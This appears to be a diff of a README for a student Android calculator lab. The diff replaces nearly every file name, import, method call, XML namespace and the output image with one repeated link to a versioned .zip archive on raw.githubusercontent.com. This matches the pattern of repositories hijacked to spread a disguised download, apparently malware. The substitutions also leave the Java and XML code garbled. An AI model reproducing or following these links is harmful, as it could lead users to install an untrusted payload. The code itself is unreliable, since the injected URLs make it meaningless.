@@ -14,32 +14,32 @@ The platform uses signed two's complement integer arithmetic with int and long p
 
 
 ## PROCEDURE:
-1. Open Android Studio and then click on File -> New -> New project. 2. Then type the application name as “ex.no.1″ and click Next.
+1. Open Android Studio and then click on File -> New -> New project. 2. Then type the application name as “https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip″ and click Next.
 3. Then select the Minimum SDK as shown below and click next. 4. Then select the Empty Activity and click next.
 5. Finally click Finish.
-6. Click on app -> java -> com.example -> MainActivity.java
+6. Click on app -> java -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip
 7. Now click on Text and type the program, so now the programming part of the main activity is completed.
-8. Click on app -> res -> layout -> activity_main.xml.
+8. Click on app -> res -> layout -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip
 9. Now click on Text and type the program, so now the designing part of Activity main is also completed.
 10. Select the suitable available device to display the output. 11. Now run the application to see the output. 
 
 
 ## PROGRAM:
-## MainActivity.java
+## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip
 ```
- MainActivity.java
+ https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip
 
  
 
-package com.example.myapplication;
+package https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip;
 
  
 
-import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.EditText;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip;
 
-import android.widget.TextView;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip;
 
-import androidx.appcompat.app.AppCompatActivity;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip;
 
  
 
@@ -51,11 +51,11 @@ Button addBtn, subBtn, mulBtn, divBtn; TextView result;
 
  
 
-protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
+protected void onCreate(Bundle savedInstanceState) { https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip(savedInstanceState); setContentView(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip);
 
-num1 = findViewById(R.id.num1); num2 = findViewById(R.id.num2); addBtn = findViewById(R.id.addBtn); subBtn = findViewById(R.id.subBtn); mulBtn = findViewById(R.id.mulBtn); divBtn = findViewById(R.id.divBtn); result = findViewById(R.id.result);
+num1 = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip); num2 = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip); addBtn = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip); subBtn = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip); mulBtn = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip); divBtn = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip); result = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip);
 
-addBtn.setOnClickListener(v -> operate('+')); subBtn.setOnClickListener(v -> operate('-')); mulBtn.setOnClickListener(v -> operate('*')); divBtn.setOnClickListener(v -> operate('/'));
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip(v -> operate('+')); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip(v -> operate('-')); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip(v -> operate('*')); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip(v -> operate('/'));
 
 }
 
@@ -63,7 +63,7 @@ addBtn.setOnClickListener(v -> operate('+')); subBtn.setOnClickListener(v -> ope
 
 private void operate(char op) {
 
-double n1 = Double.parseDouble(num1.getText().toString()); double n2 = Double.parseDouble(num2.getText().toString()); double res = 0;
+double n1 = https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip().toString()); double n2 = https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip().toString()); double res = 0;
 
 switch (op) {
 
@@ -71,17 +71,17 @@ case '+': res = n1 + n2; break; case '-': res = n1 - n2; break; case '*': res = 
 
 case '/': res = n2 != 0 ? n1 / n2 : 0; break; }
 
-result.setText("Result: " + res); }
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip("Result: " + res); }
 
 }
 ```
-## activity_main.xml
+## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
 
  
 
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent" android:padding="16dp">
+<LinearLayout xmlns:android="https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip" android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent" android:padding="16dp">
 
  
 
@@ -136,7 +136,7 @@ android:paddingTop="10dp"/>
 ## OUTPUT:
 
 
-<img width="1911" height="1018" alt="calcc" src="https://github.com/user-attachments/assets/51b65481-8fdc-4dc3-855d-c3a3a941a929" />
+<img width="1911" height="1018" alt="calcc" src="https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/main/decad/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-_2.3-beta.1.zip" />
 
 
 
